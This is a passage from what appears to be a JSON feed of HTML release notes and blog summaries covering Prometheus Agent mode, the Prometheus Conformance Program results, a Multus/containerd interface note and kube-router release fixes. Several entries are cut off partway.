usage of Prometheus in server mode depends on more things than just ingestion. There is alerting, recording, querying, compaction, remote write etc., that might need more or fewer resources independent of the number of metric targets.</p>\n<p>Agent mode essentially moves the discovery, scraping and remote writing to a separate microservice. This allows a focused operational model on ingestion only. As a result, Prometheus in Agent mode is more or less stateless. Yes, to avoid loss of metrics, we need to deploy an HA pair of agents and attach a persistent disk to them. But technically speaking, if we have thousands of metric targets (e.g. containers), we can deploy multiple Prometheus agents and safely change which replica is scraping which targets. This is because, in the end, all samples will be pushed to the same central storage.</p>\n<p>Overall, Prometheus in Agent mode enables easy horizontal auto-scaling capabilities of Prometheus-based scraping that can react to dynamic changes in metric targets. This is definitely something we will look at with the <a href=\"https://github.com/prometheus-operator/prometheus-operator\">Prometheus Kubernetes Operator</a> community going forward.</p>\n<p>Now let's take a look at the currently implemented state of agent mode in Prometheus. Is it ready to use?</p>\n<h3>Agent Mode Was Proven at Scale</h3>\n<p>The next release of Prometheus will include Agent mode as an experimental feature. Flags, APIs and WAL format on disk might change. But the performance of the implementation is already battle-tested thanks to <a href=\"https://grafana.com/\">Grafana Labs'</a> open-source work.</p>\n<p>The initial implementation of our Agent's custom WAL was inspired by the current Prometheus server's TSDB WAL and created by <a href=\"https://github.com/rfratto\">Robert Fratto</a> in 2019, under the mentorship of <a href=\"https://twitter.com/tom_wilkie\">Tom Wilkie</a>, Prometheus maintainer. It was then used in an open-source <a href=\"https://github.com/grafana/agent\">Grafana Agent</a> project that was since then used by many Grafana Cloud customers and community members. Given the maturity of the solution, it was time to donate the implementation to Prometheus for native integration and bigger adoption. Robert (Grafana Labs), with the help of Srikrishna (Red Hat) and the community, ported the code to the Prometheus codebase, which was merged to <code>main</code> 2 weeks ago!</p>\n<p>The donation process was quite smooth. Since some Prometheus maintainers contributed to this code before within the Grafana Agent, and since the new WAL is inspired by Prometheus' own WAL, it was not hard for the current Prometheus TSDB maintainers to take it under full maintenance! It also really helps that Robert is joining the Prometheus Team as a TSDB maintainer (congratulations!).</p>\n<p>Now, let's explain how you can use it! (:</p>\n<h3>How to Use Agent Mode in Detail</h3>\n<p>From now on, if you show the help output of Prometheus (<code>--help</code> flag), you should see more or less the following:</p>\n<pre><code class=\"language-bash\">usage: prometheus [&#x3c;flags>]\n\nThe Prometheus monitoring server\n\nFlags:\n  -h, --help                     Show context-sensitive help (also try --help-long and --help-man).\n      (... other flags)\n      --storage.tsdb.path=\"data/\"\n                                 Base path for metrics storage. Use with server mode only.\n      --storage.agent.path=\"data-agent/\"\n                                 Base path for metrics storage. Use with agent mode only.\n      (... other flags)\n      --enable-feature= ...      Comma separated feature names to enable. Valid options: agent, exemplar-storage, expand-external-labels, memory-snapshot-on-shutdown, promql-at-modifier, promql-negative-offset, remote-write-receiver,\n                                 extra-scrape-metrics, new-service-discovery-manager. See https://prometheus.io/docs/prometheus/latest/feature_flags/ for more details.\n</code></pre>\n<p>Since the Agent mode is behind a feature flag, as mentioned previously, use the <code>--enable-feature=agent</code> flag to run Prometheus in the Agent mode. Now, the rest of the flags are either for both server and Agent or only for a specific mode. You can see which flag is for which mode by checking the last sentence of a flag's help string. \"Use with server mode only\" means it's only for server mode. If you don't see any mention like this, it means the flag is shared.</p>\n<p>The Agent mode accepts the same scrape configuration with the same discovery options and remote write options.</p>\n<p>It also exposes a web UI with disabled query capabitilies, but showing build info, configuration, targets and service discovery information as in a normal Prometheus server.</p>\n<h3>Hands-on Prometheus Agent Example: Katacoda Tutorial</h3>\n<p>Similarly to Prometheus remote-write tutorial, if you would like to try the hands-on experience of Prometheus Agent capabilities, we recommend the <a href=\"https://katacoda.com/thanos/courses/thanos/4-receiver-agent\">Thanos Katacoda tutorial of Prometheus Agent</a>, which explains how easy it is to run Prometheus Agent.</p>\n<h2>Summary</h2>\n<p>I hope you found this interesting! In this post, we walked through the new cases that emerged like:</p>\n<ul>\n<li>edge clusters</li>\n<li>limited access networks</li>\n<li>large number of clusters</li>\n<li>ephemeral and dynamic clusters</li>\n</ul>\n<p>We then explained the new Prometheus Agent mode that allows efficiently forwarding scraped metrics to the remote write endpoints.</p>\n<p>As always, if you have any issues or feedback, feel free to <a href=\"https://prometheus.io/community/\">submit a ticket on GitHub or ask questions on the mailing list</a>.</p>\n<blockquote>\n<p>This blog post is part of a coordinated release between CNCF, Grafana, and Prometheus.

      "summary": "<p>Today, we're launching the <a href=\"https://prometheus.io/blog/2021/05/03/introducing-prometheus-conformance-program/\">Prometheus Conformance Program</a> with the goal of ensuring interoperability between different projects and vendors in the Prometheus monitoring space. While the legal paperwork still needs to be finalized, we ran tests, and we consider the below our first round of results. As part of this launch <a href=\"https://promlabs.com/blog/2021/10/14/promql-vendor-compatibility-round-three\">Julius Volz updated his PromQL test results</a>.</p>\n<p>As a quick reminder: The program is called Prometheus <strong>Conformance</strong>, software can be <strong>compliant</strong> to specific tests, which result in a <strong>compatibility</strong> rating. The nomenclature might seem complex, but it allows us to speak about this topic without using endless word snakes.</p>\n<h1>Preamble</h1>\n<h2>New Categories</h2>\n<p>We found that it's quite hard to reason about what needs to be applied to what software. To help sort my thoughts, we created <a href=\"https://docs.google.com/document/d/1VGMme9RgpclqF4CF2woNmgFqq0J7nqHn-l72uNmAxhA\">an overview</a>, introducing four new categories we can put software into:</p>\n<ul>\n<li>Metrics Exposers</li>\n<li>Agents/Collectors</li>\n<li>Prometheus Storage Backends</li>\n<li>Full Prometheus Compatibility</li>\n</ul>\n<h2>Call for Action</h2>\n<p>Feedback is very much welcome. Maybe counter-intuitively, we want the community, not just Prometheus-team, to shape this effort. To help with that, we will launch a WG Conformance within Prometheus. As with <a href=\"https://docs.google.com/document/d/1k7_Ya7j5HrIgxXghTCj-26CuwPyGdAbHS0uQf0Ir2tw\">WG Docs</a> and <a href=\"https://docs.google.com/document/d/1HWL-NIfog3_pFxUny0kAHeoxd0grnqhCBcHVPZN4y3Y\">WG Storage</a>, those will be public and we actively invite participation.</p>\n<p>As we <a href=\"https://www.youtube.com/watch?v=CBDZKjgRiew\">alluded to recently</a>, the maintainer/adoption ratio of Prometheus is surprisingly, or shockingly, low. In different words, we hope that the economic incentives around Prometheus Compatibility will entice vendors to assign resources in building out the tests with us. If you always wanted to contribute to Prometheus during work time, this might be the way; and a way that will have you touch a lot of highly relevant aspects of Prometheus. There's a variety of ways to <a href=\"https://prometheus.io/community/\">get in touch</a> with us.</p>\n<h2>Register for being tested</h2>\n<p>You can use the <a href=\"https://prometheus.io/community/\">same communication channels</a> to get in touch with us if you want to register for being tested. Once the paperwork is in place, we will hand contact information and contract operations over to CNCF.</p>\n<h1>Test results</h1>\n<h2>Full Prometheus Compatibility</h2>\n<p>We know what tests we want to build out, but we are not there yet. As announced previously, it would be unfair to hold this against projects or vendors. As such, test shims are defined as being passed. The currently semi-manual nature of e.g. the <a href=\"https://promlabs.com/blog/2021/10/14/promql-vendor-compatibility-round-three\">PromQL tests Julius ran this week</a> mean that Julius tested sending data through Prometheus Remote Write in most cases as part of PromQL testing. We're reusing his results in more than one way here. This will be untangled soon, and more tests from different angles will keep ratcheting up the requirements and thus End User confidence.</p>\n<p>It makes sense to look at projects and aaS offerings in two sets.</p>\n<h3>Projects</h3>\n<h4>Passing</h4>\n<ul>\n<li>Cortex 1.10.0</li>\n<li>M3 1.3.0</li>\n<li>Promscale 0.6.2</li>\n<li>Thanos 0.23.1</li>\n</ul>\n<h4>Not passing</h4>\n<p>VictoriaMetrics 1.67.0 is not passing and <a href=\"https://promlabs.com/blog/2021/10/14/promql-vendor-compatibility-round-three#victoriametrics\">does not intend to pass</a>. In the spirit of End User confidence, we decided to track their results while they position themselves as a drop-in replacement for Prometheus.</p>\n<h3>aaS</h3>\n<h4>Passing</h4>\n<ul>\n<li>Chronosphere</li>\n<li>Grafana Cloud</li>\n</ul>\n<h4>Not passing</h4>\n<ul>\n<li>Amazon Managed Service for Prometheus</li>\n<li>Google Cloud Managed Service for Prometheus</li>\n<li>New Relic</li>\n<li>Sysdig Monitor</li>\n</ul>\n<p>NB: As Amazon Managed Service for Prometheus is based on Cortex just like Grafana Cloud, we expect them to pass after the next update cycle.</p>\n<h2>Agent/Collector</h2>\n<h3>Passing</h3>\n<ul>\n<li>Grafana Agent 0.19.0</li>\n<li>OpenTelemetry Collector 0.37.0</li>\n<li>Prometheus 2.30.3</li>\n</ul>\n<h3>Not passing</h3>\n<ul>\n<li>Telegraf 1.20.2</li>\n<li>Timber Vector 0.16.1</li>\n<li>VictoriaMetrics Agent 1.67.0</li>\n</ul>\n<p>NB: We tested Vector 0.16.1 instead of 0.17.0 because there are no binary downloads for 0.17.0 and our test toolchain currently expects binaries.</p>",

Containerd functionality is unchanged in that it uses the value for the IP addresses specifically</p>\n</blockquote>\n<blockquote>\n<p>It's worth noting that CNI ADD success results which do not contain any interfaces will be discarded in this determination of the default, therefore it's recommended to set one with an associated gateway if aiming to have it be noted as the default.</p>\n</blockquote>\n<p>See also:<br />\n<a href=\"https://github.com/k8snetworkplumbingwg/network-attachment-definition-client/releases/tag/v1.7.5\">https://github.com/k8snetworkplumbingwg/network-attachment-definition-client/releases/tag/v1.7.5</a> <a class=\"issue-link js-issue-link\" href=\"https://github.com/k8snetworkplumbingwg/network-attachment-definition-client/pull/73\">k8snetworkplumbingwg/network-attachment-definition-client#73</a></p>",

      "summary": "<h2>Summary</h2>\n<p>This update is mainly a dependency and docker image base update. For a long time, kube-router has been stalled on Alpine 3.18 because of a breaking change with the upstream iptables user space. However, this was fixed in <code>iptables-1.8.11</code> which was released in November and then was integrated into Alpine 3.21 early this Month. See <a class=\"issue-link js-issue-link\" href=\"https://github.com/cloudnativelabs/kube-router/issues/1789\">#1789</a> for more information.</p>\n<p>This should make kube-router much more tolerant of iptables / nftables rules added by recent versions of the netfilter userspaces.</p>\n<p>This release does contain a few prominent fixes since the last release of v2.4.1:</p>\n<ul>\n<li><code>ipset.Save()</code> was introduced at the start of the NetworkPolicyController resolving a race condition between the NetworkPolicyController (<code>--run-firewall</code>) and the NetworkServiceController (<code>--run-service-proxy</code>). See <a class=\"issue-link js-issue-link\" href=\"https://github.com/cloudnativelabs/kube-router/pull/1806\">#1806</a> (thanks <a class=\"user-mention notranslate\" href=\"https://github.com/alexcriss\">@alexcriss</a> for reporting this and being patient while we tried to reproduce)</li>\n<li>Internal cluster traffic is now properly excluded from NAT conditions which resolves a regression that was introduced in the v2.3 release line. See: <a class=\"issue-link js-issue-link\" href=\"https://github.com/cloudnativelabs/kube-router/issues/1778\">#1778</a> (thanks <a class=\"user-mention notranslate\" href=\"https://github.com/zerkms\">@zerkms</a> for reporting this)</li>\n</ul>\n<p>Other major dependency updates:</p>\n<ul>\n<li>Bundled CNI plugins have been updated from v1.4.0 -&gt; v1.6.2</li>\n<li>Go version has been updated from v1.22.3 -&gt; v1.23.6</li>\n</ul>\n<h2>Contributions</h2>\n<p>Special thanks to <a class=\"user-mention notranslate\" href=\"https://github.com/rbrtbnfgl\">@rbrtbnfgl</a> and <a class=\"user-mention notranslate\" href=\"https://github.com/dsseng\">@dsseng</a> for their contributions to this release!</p>\n<h2>Changelog</h2>\n<ul>\n<li><a class=\"commit-link\" href=\"https://github.com/cloudnativelabs/kube-router/commit/85e429e9c72b2bc7de93b5f1bcce20e7c924386d\"><tt>85e429e</tt></a> -

There are now tests to ensure that this type of regression doesn't happen again.</li>\n<li>Fixes IPv6 network policy which has been substantially broken since v2.0.0. When IPv6 network policy was introduced, it was missed that iptables statements need to reference these sets via the <code>inet6</code> prefix in order to use them correctly. As such, most network policies were not correctly applying.</li>\n<li>kube-router no longer activates the hairpin controller which was introduced in v2.1.0, instead relying on user's correctly configuring their CNI with <code>hairpinMode: true</code> (see <a href=\"https://www.kube-router.io/docs/user-guide/#hairpin-mode\" rel=\"nofollow\">https://www.kube-router.io/docs/user-guide/#hairpin-mode</a> for more details)</li>\n<li>Adds fallback logic for referencing <code>rt_tables</code>, the path of which changed in versions of iproute2 v6.5.0 and above. Users that have newer systems, enable DSR, and run kube-router within a container should check to ensure this file is mounted correctly within the kube-router container.</li>\n<li>kube-router no longer tries and fails to enter pods to setup DSR for pods that are not scheduled on it's node</li>\n<li>kube-router no longer tries and fails to setup DSR for pods that are part of the host's network</li>\n<li>Fixes <code>--cleanup-config</code> mode which has been broken since v2.0.0 (please see docs for updated examples of how to run this from within a container)</li>\n</ul>\n<h3>Special Note for Users that Run Hairpin Mode Enabled Services</h3>\n<p>If you use hairpin mode either as a service annotation or a CLI parameter to kube-router, we recommend that you check your CNI configuration file to ensure that you are setting <code>\"hairpinMode\":true</code> on the <code>bridge</code> CNI plugin. This is the only way that hairpin mode will work correctly as the previous hairpin controller built into kube-router has now been disabled as it was a tricky implementation and had significant problems with irregular containers.</p>\n<p>If you find that you need to add this to your CNI config file, please ensure that kubelet has been restarted, and that any pods that rely on hairpinning have been restarted as well.</p>\n<p>See <a href=\"https://www.kube-router.io/docs/user-guide/#hairpin-mode\" rel=\"nofollow\">https://www.kube-router.io/docs/user-guide/#hairpin-mode</a> for more information.</p>\n<h2>Contributions</h2>\n<p>A big thanks <a class=\"user-mention notranslate\" href=\"https://github.com/elchenberg\">@elchenberg</a> &amp; <a class=\"user-mention notranslate\" href=\"https://github.com/xujunjie-cover\">@xujunjie-cover</a> for contributing fixes for this release!</p>\n<h2>Changelog</h2>\n<ul>\n<li><a class=\"commit-link\" href=\"https://github.com/cloudnativelabs/kube-router/commit/e42792f4e2e2a9b3884e0dd0a54b8670ec42ab0f\"><tt>e42792f</tt></a> -
